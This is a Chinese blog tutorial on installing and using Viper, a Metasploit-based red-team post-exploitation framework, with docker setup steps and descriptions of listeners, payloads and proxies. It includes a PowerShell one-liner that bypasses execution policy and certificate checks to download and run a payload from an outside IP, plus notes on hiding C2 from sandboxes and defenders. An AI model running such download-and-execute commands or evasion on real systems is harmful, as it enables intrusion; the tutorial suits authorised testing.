title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为东莞"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>东莞</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src="/img/default_cover.jpg"></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><div class="post-ai-description"><div class="ai-title"><i class="anzhiyufont anzhiyu-icon-bilibili"></i><div class="ai-title-text">AI-摘要</div><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right"></i><i class="anzhiyufont anzhiyu-icon-circle-dot" title="朗读摘要"></i><div id="ai-tag">Tianli GPT</div></div><div class="ai-explanation">AI初始化中...</div><div class="ai-btn-box"><div class="ai-btn-item">介绍自己 🙈</div><div class="ai-btn-item">生成本文简介 👋</div><div class="ai-btn-item">推荐相关文章 📖</div><div class="ai-btn-item">前往主页 🏠</div><div class="ai-btn-item" id="go-tianli-blog">前往爱发电购买</div></div><script data-pjax src="/js/anzhiyu/ai_abstract.js"></script></div><article class="post-content" id="article-container" itemscope itemtype="https://hihopkc.github.io/posts/33922.html"><header><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url">网络安全</a><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/" itemprop="url">渗透框架</a><h1 id="CrawlerTitle" itemprop="name headline">Viper渗透框架</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">hihopkc</span><time itemprop="dateCreated datePublished" datetime="2023-05-31T07:59:55.000Z" title="发表于 2023-05-31 15:59:55">2023-05-31</time><time itemprop="dateCreated datePublished" datetime="2023-08-01T09:20:06.682Z" title="更新于 2023-08-01 17:20:06">2023-08-01</time></header><h1 id="Viper渗透框架"><a href="#Viper渗透框架" class="headerlink" title="Viper渗透框架"></a>Viper渗透框架</h1><h2 id="Viper简介"><a href="#Viper简介" class="headerlink" title="Viper简介"></a>Viper简介</h2><blockquote>
<p>Viper (炫彩蛇)</p>
</blockquote>
<ul>
<li>是一款图形化内网渗透工具，将内网渗透过程中常用的战术及技术进行模块化及武器化。</li>
<li>集成杀软绕过，内网隧道,文件管理，命令行等基础功能。</li>
<li>当前已集成70+个模块，覆盖初始访问&#x2F;持久化&#x2F;权限提升&#x2F;防御绕过&#x2F;凭证访问&#x2F;信息收集&#x2F;横向移动等大类。</li>
<li>目标是帮助红队工程师提高攻击效率，简化操作，降低技术门槛。</li>
<li>支持在浏览器中运行原生 msfconsole ，且支持多人协作。</li>
</ul>
<blockquote>
<p>文档：<a target="_blank" rel="noopener" href="https://www.yuque.com/vipersec">https://www.yuque.com/vipersec</a><br>github：<a target="_blank" rel="noopener" href="https://github.com/FunnyWolf/Viper">https://github.com/FunnyWolf/Viper</a></p>
</blockquote>
<h2 id="Viper安装"><a href="#Viper安装" class="headerlink" title="Viper安装"></a>Viper安装</h2><h3 id="脚本安装"><a href="#脚本安装" class="headerlink" title="脚本安装"></a>脚本安装</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.yuque.com/vipersec/help/olg1ua">https://www.yuque.com/vipersec/help/olg1ua</a></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w vm.max_map_count=262144</span><br><span class="line">curl -o f8x https://f8x.io/   # wget -O f8x https://f8x.io/</span><br><span class="line">bash f8x -viper</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202307111813290.png" alt="image-20230711181327175"></p>
<p>提示输入viper密码，后续登入viper需要此密码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202307111818877.png" alt="image-20230711181856825"></p>
<p>等待容器启动成功，然后访问<a href="https://ip:60000,登录用户名：root，登录密码为之前自己">https://ip:60000,登录用户名：root，登录密码为之前自己</a>	设置的密码</p>
<h3 id="手动安装"><a href="#手动安装" class="headerlink" title="手动安装"></a>手动安装</h3><p>准备一台linux系统的VPS或虚拟机，首次使用建议虚拟机安装，推荐使用ubuntu系统</p>
<ol>
<li>切换到 root 用户执行命令</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br><span class="line">sysctl -w vm.max_map_count=262144</span><br><span class="line">ulimit -n 65535</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>Kali 安装 docker</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install -y apt-transport-https ca-certificates</span><br><span class="line">apt-get install dirmngr</span><br><span class="line">curl -fsSL https://mirrors.tuna.tsinghua.edu.cn/dockerce/linux/debian/gpg | sudo apt-key add -</span><br><span class="line">echo &#x27;deb https://mirrors.tuna.tsinghua.edu.cn/dockerce/linux/debian/ buster stable&#x27; | sudo tee</span><br><span class="line">/etc/apt/sources.list.d/docker.list</span><br><span class="line">apt-get update</span><br><span class="line">apt install docker-ce</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>安装 docker-compose</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apt install docker-compose</span><br><span class="line">或者</span><br><span class="line">curl -L </span><br><span class="line">https://get.daocloud.io/docker/compose/releases/download/1.25.5/docker-compose-`uname -s`-`uname -m` &gt; /usr/bin/docker-compose</span><br><span class="line">chmod +x /usr/bin/docker-compose</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>设置安装目录</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export VIPER_DIR=/root/VIPER</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>生成安装目录，并进入安装目录</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p $VIPER_DIR &amp;&amp; cd $VIPER_DIR</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>生成 docker-compose.yml</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">tee docker-compose.yml &lt;&lt;-&#x27;EOF&#x27;</span><br><span class="line">version: &quot;3&quot;</span><br><span class="line">services:</span><br><span class="line"> viper:</span><br><span class="line">   image: registry.cn-shenzhen.aliyuncs.com/toys/viper:latest</span><br><span class="line">   container_name: viper-c</span><br><span class="line">   network_mode: &quot;host&quot;</span><br><span class="line">   restart: always</span><br><span class="line">   volumes:</span><br><span class="line">     - $&#123;PWD&#125;/loot:/root/.msf4/loot</span><br><span class="line">     - $&#123;PWD&#125;/db:/root/viper/Docker/db</span><br><span class="line">     - $&#123;PWD&#125;/module:/root/viper/Docker/module</span><br><span class="line">     - $&#123;PWD&#125;/log:/root/viper/Docker/log</span><br><span class="line">     - $&#123;PWD&#125;/nginxconfig:/root/viper/Docker/nginxconfig</span><br><span class="line">   command: [&quot;VIPER_PASSWORD&quot;]</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>

<blockquote>
<p>外网 VPS 也可以将 registry.cn-shenzhen.aliyuncs.com&#x2F;toys&#x2F;viper:latest<br>替换成 registry.cn-hongkong.aliyuncs.com&#x2F;toys&#x2F;viper:latest</p>
</blockquote>
<ol start="7">
<li>设置登录密码</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export VIPER_PASSWORD=VIPER@PASS</span><br></pre></td></tr></table></figure>

<ol start="8">
<li>写入密码到 docker-compose.yml</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i &quot;s/VIPER_PASSWORD/$VIPER_PASSWORD/g&quot; docker-compose.yml</span><br></pre></td></tr></table></figure>

<ol start="9">
<li>启动 Viper</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd $VIPER_DIR</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<p>注意： 所有的 docker-compose 命令必须在安装目录执行才会有效果</p>
<h2 id="Viper-登录"><a href="#Viper-登录" class="headerlink" title="Viper 登录"></a>Viper 登录</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.yuque.com/vipersec/help/oktwb7">https://www.yuque.com/vipersec/help/oktwb7</a></p>
</blockquote>
<p>等待15s系统启动</p>
<p>访问登录服务器： <a target="_blank" rel="noopener" href="https://yourip:60000/">https://yourip:60000</a><br>用户名： root<br>密码： VIPER@PASS<br>查看密码： cat &#x2F;root&#x2F;VIPER&#x2F;docker-compose.yml<br>查看端口： cat &#x2F;root&#x2F;VIPER&#x2F;nginxconfig&#x2F;viper.conf ，默认端口为 60000</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202307121201970.png" alt="image-20230712120117807"></p>
<p>注意：<br>如果你使用VPS部署Viper,请确认VPS的防火墙开放了60000端口及后续监听需要的端口</p>
<h2 id="Viper-配置"><a href="#Viper-配置" class="headerlink" title="Viper 配置"></a>Viper 配置</h2><h3 id="版本更新"><a href="#版本更新" class="headerlink" title="版本更新"></a>版本更新</h3><p>删除原有容器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /root/VIPER             # 进入viper安装目录</span><br><span class="line">docker-compose down         # 删除现有容器</span><br></pre></td></tr></table></figure>

<p>更新 docker 镜像</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose pull</span><br></pre></td></tr></table></figure>

<p>新建并启动容器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<h3 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h3><ul>
<li>临时修改密码</li>
</ul>
<blockquote>
<p>适用于需要在不重启 Viper 的情况下修改密码， Viper 更新后密码不会保留Viper 不允许使用默认密码,VIPER@PASS 替换为自定义密码密码且大于8位</p>
</blockquote>
<p>进入 Docker 镜像命令行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it viper-c bash</span><br></pre></td></tr></table></figure>

<p>执行修改密码命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">viper -pw VIPER@PW</span><br></pre></td></tr></table></figure>

<ul>
<li>持久化修改密码</li>
</ul>
<blockquote>
<p>需要重启 Viper<br>Viper 不允许使用默认密码, VIPER@PASS 替换为自定义密码密码且大于8位</p>
</blockquote>
<ol>
<li><p>进入安装目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /root/VIPER</span><br></pre></td></tr></table></figure>
</li>
<li><p>设置密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export VIPER_PASSWORD=VIPER@PASS</span><br></pre></td></tr></table></figure>
</li>
<li><p>写入密码到 docker-compose.yml</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i &quot;s/VIPER_PASSWORD/$VIPER_PASSWORD/g&quot; docker-compose.yml</span><br></pre></td></tr></table></figure>
</li>
<li><p>重新建立容器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root/VIPER            # 进入Viper安装目录</span><br><span class="line">docker-compose down       # 删除现有容器</span><br><span class="line">docker-compose up -d      # 重启启动容器     </span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="关闭-重启"><a href="#关闭-重启" class="headerlink" title="关闭&#x2F;重启"></a>关闭&#x2F;重启</h3><ul>
<li>临时关闭 Viper</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /root/VIPER</span><br><span class="line">docker-compose stop</span><br></pre></td></tr></table></figure>

<p>重新启动 Viper</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /root/VIPER</span><br><span class="line">docker-compose start</span><br></pre></td></tr></table></figure>

<ul>
<li>查看容器日志</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker logs viper-c</span><br></pre></td></tr></table></figure>

<ul>
<li>进入容器命令行</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it viper-c bash</span><br></pre></td></tr></table></figure>

<h3 id="安装目录"><a href="#安装目录" class="headerlink" title="安装目录"></a>安装目录</h3><blockquote>
<p>Viper 通过 docker 挂载目录的方式持久化保存数据</p>
</blockquote>
<ul>
<li>db目录</li>
</ul>
<p>[db.sqlite3]： 是Viper的SQL数据库文件<br>[dump.rdb] ： 是Viper缓存数据库文件</p>
<ul>
<li>log目录</li>
</ul>
<p>[access.log] ： nginx访问日志<br>[error.log] ： nginx错误日志<br>[daphne.log] ： viperpython websocket运行日志<br>[uwsgi.log] ： viperpython http服务运行日志<br>[viperpython.log] ： vipepython 主服务运行日志<br>[puma.log] ： msf接口服务日志</p>
<ul>
<li>loot目录</li>
</ul>
<p>存放用户 下载&#x2F;上传 的文件</p>
<ul>
<li>module目录</li>
</ul>
<p>存放自定义模块</p>
<ul>
<li>nginxconfig目录</li>
</ul>
<p>[gencert.sh] ：用于生成自定义 ssl 证书<br>[ssl.crt][ ssl.csr][ ssl.key][ ssl.origin.key] ： [ssl] 证书相关文件，用于 [nginx]<br>[viper.conf] ： [nginx] 子配置文件，用户可通过该配置文件自定义 [nginx] 配置</p>
<h2 id="Viper基本使用"><a href="#Viper基本使用" class="headerlink" title="Viper基本使用"></a>Viper基本使用</h2><h3 id="实时输出"><a href="#实时输出" class="headerlink" title="实时输出"></a>实时输出</h3><ul>
<li>模块结果</li>
</ul>
<p>左侧：显示主机IP&#x2F;模块&#x2F;参数&#x2F;结果等信息</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202307121513088.png" alt="image-20230712151359041"></p>
<p>顶部支持 搜索过滤 重置过滤 清空数据 等操作.</p>
<ul>
<li>平台日志</li>
</ul>
<p>右侧：列表展示平台运行日志，日志包含关键操作通知，模块运行过程中的日志等信息</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202307121514853.png" alt="image-20230712151415815"></p>
<p>顶部输入还支持多用户聊天</p>
<h3 id="任务列表"><a href="#任务列表" class="headerlink" title="任务列表"></a>任务列表</h3><ul>
<li>[任务列表] 标签会提示当前有多少任务正在运行</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202307121514833.png" alt="image-20230712151458791"></p>
<ul>
<li>可以点击任务对应的模块名称查看模块详细信息</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202307121520532.png" alt="1591155371070-784abde0-300e-4c1f-81c0-01f4617856a9"></p>
<p>结果在实时输出里面查看</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202307121525667.png" alt="1591154326073-10c08d14-bb55-47ec-aaef-ac8e0c16e55b"></p>
<ul>
<li><p>面板会显示 开始时间 模块 模块涉及的Sessionid 模块参数</p>
</li>
<li><p>可以使用 删除 终止任务运行</p>
</li>
</ul>
<h3 id="监听载荷"><a href="#监听载荷" class="headerlink" title="监听载荷"></a>监听载荷</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.yuque.com/vipersec/help/rxb29t">https://www.yuque.com/vipersec/help/rxb29t</a></p>
</blockquote>
<p>payload 又称为攻击载荷，主要是用来建立目标机与攻击机稳定连接的，可返回shell ，也可以进行程序注入等。</p>
<h4 id="Stageless"><a href="#Stageless" class="headerlink" title="Stageless"></a>Stageless</h4><p>payload 分为 staged (分阶段)和 stageless (不分阶段):</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Stageless payload: &lt;platform&gt;/[arch]/&lt;single&gt;</span><br></pre></td></tr></table></figure>

<p>Stageless Meterpreter 是一个二进制文件，包含 Meterpreter 的所有必需部分以及所有必需的扩展全部捆绑在 一起，将完整的 payload 都编译在木马中，体积庞大，可直接独立地植入目标系统进行执行</p>
<h4 id="Staged"><a href="#Staged" class="headerlink" title="Staged"></a>Staged</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Staged payload: &lt;platform&gt;/[arch]/&lt;stage&gt;/&lt;stager&gt;</span><br></pre></td></tr></table></figure>

<p>Staged Meterpreter 负责建立目标用户与攻击者之间的网络连接，将执行传递到另一个阶段，MSF提供了传输器和传输体配对分阶段植入的技术，由渗透攻击模块首先植入代码，短小精悍且可靠的传输器载荷，然后在运行传输器载荷时进一步下载传输体载荷并执行，比如加载meterpreter、VNC桌面控制等复杂的大型攻击载荷。</p>
<p>[stageless 和 staged 就像web入侵里面提到的大马和小马一样，一个功能齐全，一个只是构造一个连接或命令执行，还需通过其他工具和脚本进行管理]</p>
<table>
<thead>
<tr>
<th>Payload</th>
<th>Staged</th>
<th>Stageless</th>
</tr>
</thead>
<tbody><tr>
<td>Reverse TCP</td>
<td>windows&#x2F;meterpreter&#x2F;reverse_tcp</td>
<td>windows&#x2F;meterpreter_reverse_tcp</td>
</tr>
<tr>
<td>Reverse HTTPS</td>
<td>windows&#x2F;meterpreter&#x2F;reverse_https</td>
<td>windows&#x2F;meterpreter_reverse_https</td>
</tr>
<tr>
<td>Bind TCP</td>
<td>windows&#x2F;meterpreter&#x2F;bind_tcp</td>
<td>windows&#x2F;meterpreter_bind_tcp</td>
</tr>
<tr>
<td>Reverse TCP IPv6</td>
<td>windows&#x2F;meterpreter&#x2F;reverse_ipv6_tcp</td>
<td>windows&#x2F;meterpreter_reverse_ipv6_tcp</td>
</tr>
</tbody></table>
<h4 id="监听"><a href="#监听" class="headerlink" title="监听"></a>监听</h4><p>在MSF原生的 hander&#x2F;payload 基础上，Viper增加了如下两项功能</p>
<ul>
<li><p>增加虚拟监听的概念,在内网渗透的某些场景中(如注入shellcode,spawn进程,AB网正向hander),我们只需要快捷的调用已有的监听配置,不需要实际建立网络监听或网络连接</p>
</li>
<li><p>2、虚拟监听和实际监听可相互转化</p>
</li>
</ul>
<p>1、新增监听</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202307121527222.png" alt="image-20230712152714155"></p>
<p>-<br>  虚拟监听 是指将输入的监听配置选项存储在缓存中,但不在服务器中建立实际运行的监听.后续在运行模块&#x2F;传输协议时可以快速选择该监听配置.</p>
<ul>
<li><p>虚拟监听 在系统重启后仍然存在,可用于鱼叉钓鱼,持久化等场景</p>
</li>
<li><p>真实的监听使用绿色图标表示,虚拟监听使用灰色图标表示</p>
</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202307121528121.png" alt="image-20230712152816067"></p>
<ul>
<li>虚拟监听与实际监听可通过 虚拟化 实例化 相互转换</li>
</ul>
<h4 id="载荷"><a href="#载荷" class="headerlink" title="载荷"></a>载荷</h4><p>1、快速生成</p>
<ul>
<li>可以点击监听中的 生成载荷 按钮快速生成载荷,Windows类型载荷为源码编译版本,linux类型载荷为elf类型.</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202307121529891.png" alt="2"></p>
<p>2、配置生成</p>
<ul>
<li>选择下方 生成载荷 按钮可以手动输入配置生成载荷.</li>
<li>选择 自动监听 选项,在生成载荷完成后自动添加载荷所对应的监听</li>
</ul>
<h3 id="监听防火墙"><a href="#监听防火墙" class="headerlink" title="监听防火墙"></a>监听防火墙</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.yuque.com/vipersec/help/lxlre4">https://www.yuque.com/vipersec/help/lxlre4</a></p>
</blockquote>
<p>每当客户端连接 viper 的监听时， viper 会根据客户端的网络IP地址来判断该IP是否允许连接监听。</p>
<p>允许时则正常传输载荷到客户端，不允许时直接断开网络连接。</p>
<ul>
<li>使用场景</li>
</ul>
<ol>
<li>当使用鱼叉钓鱼时,目标的地理位置为一个固定区域(例如一个省),监听防火墙可以屏蔽其他国外或其他省的IP连接监听</li>
<li>红队模拟时,如果可以根据需要屏蔽沙箱及网络测绘服务器连接监听</li>
<li>如果IP地址不被允许连接监听,则客户端(通常为沙箱或者蓝队人员)无法获取stager,就无法判断C2服务器类型.</li>
</ol>
<h3 id="WebDelivery"><a href="#WebDelivery" class="headerlink" title="WebDelivery"></a>WebDelivery</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.yuque.com/vipersec/help/kvxr65">https://www.yuque.com/vipersec/help/kvxr65</a></p>
</blockquote>
<p>WebDelivery 功能与 MSF 的 exploit&#x2F;multi&#x2F;script&#x2F;web_delivery 功能相同。</p>
<p>用于一句话加载 payload 。常用于可以执行命令，但是不方便上传文件的场景。</p>
<h3 id="文件列表"><a href="#文件列表" class="headerlink" title="文件列表"></a>文件列表</h3><p>1、上传&#x2F;下载</p>
<ul>
<li>支持拖拽文件上传及点击上传,点击 下载 自动使用浏览器下载</li>
</ul>
<p>2、查看</p>
<ul>
<li>支持直接预览文本文件及图片</li>
</ul>
<p>3、一句话下载</p>
<p>当文件上传到服务器后, Viper 默认提供网络下载功能，界面中会提示各种版本的一句话下载.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">powershell -ep bypass -c &quot;</span><br><span class="line"></span><br><span class="line">[System.Net.ServicePointManager]::ServerCertificateValidationCall</span><br><span class="line"></span><br><span class="line">back = &#123;$true&#125;;iex(new-object </span><br><span class="line">net.webclient).downloadstring(&#x27;https://124.71.45.28:60000/api/v1/</span><br><span class="line">d/?en=w1ythf9LuGmBMdLZMYlk6Q==&#x27;)&quot;</span><br></pre></td></tr></table></figure>



<h3 id="网络拓扑"><a href="#网络拓扑" class="headerlink" title="网络拓扑"></a>网络拓扑</h3><p>汇总端口扫描,历史Session上线信息,当前Session信息及当前路由信息,分析处理后生成网络拓扑图.</p>
<h3 id="自动编排"><a href="#自动编排" class="headerlink" title="自动编排"></a>自动编排</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.yuque.com/vipersec/help/gh60e1">https://www.yuque.com/vipersec/help/gh60e1</a></p>
</blockquote>
<p>每当有新的Session(权限)上线时,会自动按照顺序执行 自动编排 中已经配置好的模块.</p>
<ul>
<li>时间间隔</li>
</ul>
<p>可以通过该参数设置每个模块执行的间隔时间,避免短时间内执行多个模块导致报警或不稳定</p>
<ul>
<li>单一主机最大权限数量</li>
</ul>
<p>如果在 自动编排 中配置了会生成新的权限的模块(比如 上传并执行可执行文件 ),则可能会出现死循环:新的权限-&gt;自动编排模块-&gt;自动编排模块导致新的权限-&gt;自动编排模块&gt;…</p>
<p>在配置了该参数之后,如果系统判断单一主机(同一个内网IP)对应的权限数量大于配置数量,则自动跳过自动编排模块.</p>
<h3 id="内网代理"><a href="#内网代理" class="headerlink" title="内网代理"></a>内网代理</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.yuque.com/vipersec/help/cv0shx">https://www.yuque.com/vipersec/help/cv0shx</a></p>
</blockquote>
<p>Viper 的内网代理功能基于 MSF 的 socks4a&#x2F;socks5 代理模块集成而来。 Viper 将内网路由，端口转发，内网代理集中控制，方便使用。</p>
<p>1、路由路径</p>
<ul>
<li><p>内网代理 路由路径 中可以查看所有主机的路由信息</p>
</li>
<li><p>如果不存在对应路由,则用网络直连表示</p>
</li>
</ul>
<p>2、路由列表</p>
<ul>
<li>查看所有 Session 中的路由</li>
</ul>
<p>3、端口转发</p>
<ul>
<li>查看所有Session的端口转发配置</li>
</ul>
<p>4、内网代理</p>
<ul>
<li>内网代理可以添加 socks4a、socks5 两种代理，socks5代理不支持udp</li>
<li>代理使用的路由基于 内网路由 ,使用代理前确认配置了正确的路由.</li>
</ul>
<h3 id="凭证列表"><a href="#凭证列表" class="headerlink" title="凭证列表"></a>凭证列表</h3><p>-<br>  通过模块获取到的密码信息都会存储在此处</p>
<ul>
<li>也可以手动添加</li>
</ul>
<h3 id="MSFCONSOLE"><a href="#MSFCONSOLE" class="headerlink" title="MSFCONSOLE"></a>MSFCONSOLE</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.yuque.com/vipersec/help/tzugzn">https://www.yuque.com/vipersec/help/tzugzn</a></p>
</blockquote>
<p>Metasploit console 控制台</p>
<p>1、常规操作</p>
<ul>
<li>原生复制msfconsole操作</li>
<li>支持tab智能提示</li>
<li>支持Ctrl+C终止&#x2F;Ctrl-Z切换到后台等操作</li>
<li>支持选择文本自动复制到剪切板功能</li>
</ul>
<p>2、特殊命令</p>
<ul>
<li>如果出现命令行假死等问题,可以通过输入viper进行重置操作</li>
</ul>
